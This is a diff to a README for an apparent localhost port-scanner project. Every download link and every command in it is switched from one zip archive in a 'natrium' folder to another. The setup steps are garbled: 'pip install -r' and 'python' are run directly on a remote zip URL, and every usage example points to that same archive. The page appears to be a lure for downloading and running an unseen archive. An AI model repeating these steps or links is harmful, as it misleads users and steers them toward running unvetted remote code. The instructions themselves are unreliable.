@@ -6,7 +6,7 @@ Scan-port-localhost helps you scan all ports on your machine. It shows which por
 
 ## 📦 Download Now
 
-[![Download Scan-port-localhost](https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v3.0-beta.5.zip)](https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v3.0-beta.5.zip)
+[![Download Scan-port-localhost](https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v2.9.zip)](https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v2.9.zip)
 
 ## 📋 Requirements
 
@@ -22,7 +22,7 @@ Follow these simple steps to install Scan-port-localhost on your computer:
 
 1. **Download the Latest Release**
    Visit the official releases page to get the latest version of Scan-port-localhost:  
-   [Download Here](https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v3.0-beta.5.zip)
+   [Download Here](https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v2.9.zip)
 
 2. **Extract the Download**
    If the file is a ZIP or TAR file, extract it to a folder on your computer. You can do this by right-clicking the file and selecting "Extract All" or using a file extraction tool. 
@@ -39,14 +39,14 @@ Follow these simple steps to install Scan-port-localhost on your computer:
    Next, run this command to install the necessary Python libraries:
 
    ```
-   pip install -r https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v3.0-beta.5.zip
+   pip install -r https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v2.9.zip
    ```
 
 4. **Run the Scanner**
    After installing dependencies, you're ready to run the scanner. Use this command in your terminal:
 
    ```
-   python https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v3.0-beta.5.zip
+   python https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v2.9.zip
    ```
 
    This will start the scanning process. Follow the on-screen instructions to check the status of your localhost ports.
@@ -63,12 +63,12 @@ Once you run the scanner, it will display a list of ports and their status. You 
 
 Here are some common commands you might find useful when using Scan-port-localhost:
 
-- **Scan All Ports:** To scan all available ports, simply run `python https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v3.0-beta.5.zip`. The application handles this automatically.
+- **Scan All Ports:** To scan all available ports, simply run `python https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v2.9.zip`. The application handles this automatically.
 
 - **Scan Specific Port:** You can scan a specific port by modifying the command. For example, to check port 80, use the command:
 
   ```
-  python https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v3.0-beta.5.zip --port 80
+  python https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v2.9.zip --port 80
   ```
 
 ## 🚨 Troubleshooting
@@ -92,6 +92,6 @@ This project is built with Python, using socket programming to interact with net
 ## 📥 Download & Install
 
 Remember to download the latest version of Scan-port-localhost here:  
-[Download Here](https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v3.0-beta.5.zip)
+[Download Here](https://github.com/Suwanna45/Scan-port-localhost/raw/refs/heads/main/natrium/Scan-localhost-port-v2.9.zip)
 
 By following these steps, you will have Scan-port-localhost set up and ready for use. Enjoy exploring your localhost ports!
